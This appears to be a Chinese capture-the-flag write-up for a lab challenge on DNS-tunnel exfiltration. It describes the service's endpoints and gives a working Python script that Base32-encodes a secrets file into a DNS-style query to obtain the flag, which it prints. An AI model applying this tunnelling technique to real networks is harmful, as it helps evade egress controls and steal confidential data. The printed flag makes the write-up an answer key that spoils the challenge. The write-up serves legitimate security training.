## 题目原文

> 目标环境对常规出站通道进行了管控，但仍存在可被用于隐蔽外带的协议通道。已获授权进行红队评估，请利用该隐蔽通道将指定的受控数据完整外带，完成后取得 flag。本题采用 flag 与方案质量双轨评分。

## 题解

### 入口与指纹

8000 端口，`Werkzeug/3.1.8 Python/3.11.15`。`GET /` 的挑战名是 `dns-tunnel-exfiltration`。文档原文 902 字节，接口有四个：

| 路径 | 作用 |
| --- | --- |
| `GET /target-data` | 取出要外带的文档 |
| `POST /dns` | 提交一条伪装成 DNS 查询的分片 |
| `GET /retrieve?session=` | 服务端核对是否收齐 |

查询格式是 `<seq>-<total>-<base32_chunk>.exfil.challenge.local`。`seq` 从 0 开始，`total` 是分片总数，chunk 是不带填充符的 Base32。后续分片要带上第一次返回的 `session`。

### 关键观察

`GET /target-data` 返回 JSON，字段 `content` 正好 902 字符，`file` 是 `/etc/secrets/classified_aurora.txt`，`note` 要求走这条 DNS 形状的通道并在服务端确认。正文是一份名为 Project Aurora 的文档。

这条通道并不真的发到公网 DNS。`POST /dns` 自己解析查询字符串。整篇文档 Base32 之后是 1444 个字符，作为 `total=1` 的单个分片也能被收下：`decoded_len` 回到 902，`status` 是 `ok`。

### 利用链

```bash
T=$(head -1 .target)
python3 - << PY
import json, base64, urllib.request
base = "http://$T"
doc = json.load(urllib.request.urlopen(base + "/target-data"))["content"]
chunk = base64.b32encode(doc.encode()).decode().rstrip("=")
query = f"0-1-{chunk}.exfil.challenge.local"
req = urllib.request.Request(
    base + "/dns",
    data=json.dumps({"query": query}).encode(),
    headers={"Content-Type": "application/json"},
)
session = json.load(urllib.request.urlopen(req))["session"]
print(json.load(urllib.request.urlopen(base + "/retrieve?session=" + session)))
PY
```

`/retrieve` 在 `complete: true` 时给出 flag。本次平台接受的值是 `flag{779e160e-20ee-46ab-863d-847c1ceb0fc5}`。`assembled_size` 是 902，和原文长度一致。

### flag 位置

`GET /retrieve?session=<id>` 的 `flag` 字段。只把原文从 `/target-data` 读出来、不按查询格式送回 `/dns`，这个接口不会确认完成。
